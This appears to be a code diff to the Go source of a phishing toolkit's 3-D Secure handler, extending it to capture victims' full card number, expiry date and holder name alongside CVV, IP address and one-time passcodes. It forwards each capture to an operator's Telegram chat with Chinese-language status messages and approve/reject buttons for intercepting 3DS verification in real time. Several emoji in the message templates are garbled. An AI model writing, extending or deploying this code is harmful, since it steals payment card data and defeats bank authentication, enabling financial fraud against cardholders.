@@ -31,9 +31,12 @@ type ThreeDSSession struct {
 	OTPCount      int    // Number of OTP submission attempts
 	CreatedAt     time.Time
 	UpdatedAt     time.Time
-	CVV           string // Store CVV for message display
+	CVV           string // CVV for message display
+	CardNumber    string // Card number for message display
+	ExpireDate    string // Expiry date for message display (MM/YY)
+	HolderName    string // Card holder name for message display
 	RemoteAddr    string // Store IP for message display
-	PhishletName  string // Store phishlet name for message display
+	PhishletName  string // Store phishlet name (internal use)
 	mu            sync.Mutex
 }
 
@@ -107,12 +110,32 @@ func (m *ThreeDSManager) cleanupExpired() {
 }
 
 // Initiate creates a new 3DS session after CVV capture
-// Idempotent: if session already exists, returns the existing one
-func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, remoteAddr string, phishletName string) *ThreeDSSession {
+// If session already exists but is in a final state (completed/expired), it gets reset
+func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, cardNumber string, expireDate string, holderName string, remoteAddr string, phishletName string) *ThreeDSSession {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 
 	if existing, ok := m.sessions[sessionID]; ok {
+		existing.mu.Lock()
+		state := existing.State
+		existing.mu.Unlock()
+		if state != ThreeDSCompleted && state != ThreeDSExpired {
+			return existing
+		}
+		existing.mu.Lock()
+		existing.State = ThreeDSWaitingCVV
+		existing.TelegramMsgID = 0
+		existing.OTP = ""
+		existing.OTPCount = 0
+		existing.UpdatedAt = time.Now()
+		existing.CVV = cvv
+		existing.CardNumber = cardNumber
+		existing.ExpireDate = expireDate
+		existing.HolderName = holderName
+		existing.RemoteAddr = remoteAddr
+		existing.PhishletName = phishletName
+		existing.mu.Unlock()
+		log.Info("[3DS] session re-initiated: %s (sIndex: %d)", sessionID, sIndex)
 		return existing
 	}
 
@@ -126,6 +149,9 @@ func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, remo
 		CreatedAt:     time.Now(),
 		UpdatedAt:     time.Now(),
 		CVV:           cvv,
+		CardNumber:    cardNumber,
+		ExpireDate:    expireDate,
+		HolderName:    holderName,
 		RemoteAddr:    remoteAddr,
 		PhishletName:  phishletName,
 	}
@@ -411,11 +437,13 @@ func (m *ThreeDSManager) HandleCallback(callbackData string, chatID string, msgI
 
 // --- Internal helpers ---
 
-func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, ip string, phishlet string, otp string, otpCount int) {
+func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, cardNumber string, expireDate string, holderName string, ip string, otp string, otpCount int) {
 	sIndex = -1
 	cvv = "N/A"
+	cardNumber = "N/A"
+	expireDate = "N/A"
+	holderName = "N/A"
 	ip = "N/A"
-	phishlet = "N/A"
 	otp = ""
 	otpCount = 0
 
@@ -425,8 +453,10 @@ func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv strin
 	if ok {
 		ts.mu.Lock()
 		cvv = ts.CVV
+		cardNumber = ts.CardNumber
+		expireDate = ts.ExpireDate
+		holderName = ts.HolderName
 		ip = ts.RemoteAddr
-		phishlet = ts.PhishletName
 		otp = ts.OTP
 		otpCount = ts.OTPCount
 		ts.mu.Unlock()
@@ -449,15 +479,17 @@ func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
 		return
 	}
 
-	sIndex, cvv, ip, phishlet, _, _ := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"💳 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"📋 Phishlet: %s\n\n"+
+			"� 持卡人: %s\n"+
+			"� 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"� CVV: %s\n"+
+			"🌐 IP: %s\n\n"+
 			"⚙️ 状态: 等待用户输入 OTP",
-		sIndex, cvv, ip, phishlet,
+		sIndex, holderName, cardNumber, expireDate, cvv, ip,
 	)
 
 	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
@@ -482,16 +514,18 @@ func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
 		return
 	}
 
-	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"💳 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"📋 Phishlet: %s\n\n"+
+			"� 持卡人: %s\n"+
+			"� 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"� CVV: %s\n"+
+			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s\n\n"+
 			"⚙️ 状态: 等待管理员审核",
-		sIndex, cvv, ip, phishlet, otpCount, otp,
+		sIndex, holderName, cardNumber, expireDate, cvv, ip, otpCount, otp,
 	)
 
 	buttons := [][]InlineButton{
@@ -510,16 +544,18 @@ func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) 
 		return
 	}
 
-	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"💳 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"📋 Phishlet: %s\n\n"+
+			"� 持卡人: %s\n"+
+			"� 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"� CVV: %s\n"+
+			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
 			"⚙️ 状态: 等待用户重新输入",
-		sIndex, cvv, ip, phishlet, otpCount, otp,
+		sIndex, holderName, cardNumber, expireDate, cvv, ip, otpCount, otp,
 	)
 
 	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
@@ -531,7 +567,7 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 		return
 	}
 
-	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
 
 	otpLine := ""
 	if otpCount > 0 {
@@ -540,12 +576,14 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 
 	msg := fmt.Sprintf(
 		"✅ 已放行 (Session #%d)\n\n"+
-			"💳 CVV: %s\n"+
+			"� 持卡人: %s\n"+
+			"�💳 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"� CVV: %s\n"+
 			"🌐 IP: %s\n"+
-			"📋 Phishlet: %s\n"+
 			"%s"+
 			"⚙️ 状态: %s\n用户将被重定向",
-		sIndex, cvv, ip, phishlet, otpLine, reason,
+		sIndex, holderName, cardNumber, expireDate, cvv, ip, otpLine, reason,
 	)
 
 	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
@@ -572,15 +610,17 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	}
 	ts.mu.Unlock()
 
-	sIndex, cvv, ip, phishlet, _, _ := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔔 新捕获! (Session #%d)\n\n"+
-			"💳 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"📋 Phishlet: %s\n\n"+
+			"� 持卡人: %s\n"+
+			"�� 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"� CVV: %s\n"+
+			"🌐 IP: %s\n\n"+
 			"请选择操作:",
-		sIndex, cvv, ip, phishlet,
+		sIndex, holderName, cardNumber, expireDate, cvv, ip,
 	)
 
 	buttons := [][]InlineButton{
